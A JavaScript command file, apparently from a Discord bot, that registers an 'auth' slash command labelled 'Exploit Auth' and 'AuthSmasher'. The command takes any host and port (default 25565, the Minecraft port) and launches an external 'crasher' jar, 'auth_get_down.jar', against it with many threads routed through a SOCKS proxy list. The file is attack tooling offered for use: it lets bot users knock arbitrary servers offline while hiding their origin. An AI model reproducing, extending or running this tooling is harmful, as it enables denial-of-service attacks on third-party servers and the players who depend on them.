/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');

module.exports = new Command({
    name: "auth",
    description: "Exploit Auth",
    permissions: "SEND_MESSAGES",
    slashCommandOptions: [{
        name: "host",
        type: "STRING",
        description: "Enter host or ip server",
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: "NUMBER",
        required: false
    }],
    async execute(client, args, interaction, crashers){
        const host = args.getString("host");
        const port = args.getNumber("port") || 25565;

        if (/^[a-zA-Z0-9.]+$/.test(host) == false) return crashers.errorembed(client, interaction, interaction.commandName, "Не валидный IP");

        crashers.runcrasher(client, interaction, {
            jarname: "auth_get_down.jar",
            jarargs: `${host}:${port} ${threads.auth} 0 auth socks_proxies.txt`
        }, {
            method: "AuthSmasher 💥",
            host: host,
            port: `${port}`
        });
    }
});